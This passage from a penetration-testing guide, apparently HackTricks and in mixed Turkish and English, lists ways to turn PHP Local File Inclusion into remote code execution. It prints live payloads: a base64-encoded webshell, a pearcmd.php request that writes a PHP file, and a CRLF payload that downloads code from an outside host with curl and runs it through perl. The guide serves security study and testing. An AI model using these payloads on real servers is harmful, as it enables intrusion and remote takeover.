FTP sunucusu vsftpd'nin logları _**/var/log/vsftpd.log**_ konumundadır. Bir Local File Inclusion (LFI) zafiyeti varsa ve açık bir vsftpd sunucusuna erişim mümkünse, aşağıdaki adımlar değerlendirilebilir:

1. Giriş işlemi sırasında kullanıcı adı alanına bir PHP payload enjekte edin.
2. Enjeksiyondan sonra, LFI'yi kullanarak sunucu loglarını _**/var/log/vsftpd.log**_ dosyasından alın.

### php base64 filter ile (base64 kullanarak)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. Bunu dosya uzantısı kontrolünü atlatmak için kullanabilirsiniz: eğer ".php" ile biten base64 sağlarsanız, filtre "." karakterini yoksayar ve "php"yi base64'e ekler. İşte bir örnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters ile (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) açıklar ki **php filters to generate arbitrary content** olarak çıktı üretmek için kullanabilirsiniz. Bu temelde include için **generate arbitrary php code** oluşturabileceğiniz ve bunu bir dosyaya yazmaya **without needing to write** gerekmeden yapabileceğiniz anlamına gelir.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault ile

Bir dosyayı yükleyin; bu dosya `/tmp` içinde geçici olarak saklanacaktır. Ardından aynı istekte bir **segmentation fault** tetikleyin; böylece geçici dosya silinmeyecek ve onu arayabilirsiniz.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage ile

Eğer bir **Local File Inclusion** bulduysanız ve **Nginx** PHP'nin önünde çalışıyorsa, aşağıdaki teknikle RCE elde edebilirsiniz:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS ile

Eğer bir **Local File Inclusion** bulduysanız — oturumunuz olmasa bile ve `session.auto_start` `Off` olsa bile — multipart POST verisinde **`PHP_SESSION_UPLOAD_PROGRESS`** sağlarsanız, PHP oturumu sizin için etkinleştirecektir. Bunu RCE elde etmek için suistimal edebilirsiniz:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows üzerinde temp file uploads ile

Eğer bir **Local File Inclusion** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa, RCE elde edebilirsiniz:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args ile

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), `/usr/local/lib/phppearcmd.php` scripti php docker images'ta varsayılan olarak bulunur. Ayrıca URL aracılığıyla script'e argüman geçirmek mümkündür çünkü eğer bir URL parametresi `=` içermiyorsa argüman olarak kullanılacağı belirtilmiştir. Ayrıca bkz. [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) ve [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Aşağıdaki örnek, CRLF vulnunu RCE elde etmek için kötüye kullanır (kaynak: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file_uploads = on you can get RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

Eğer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini include ederseniz. (Bu hatayı tetiklemek için aynı dosyayı 2 kez include etmeniz gerekir).

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

**Bunun ne kadar kullanışlı olabileceğini bilmiyorum ama işe yarayabilir.**\
_Bir PHP Fatal Error'a neden olsanız bile, upload edilen PHP geçici dosyaları silinir._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
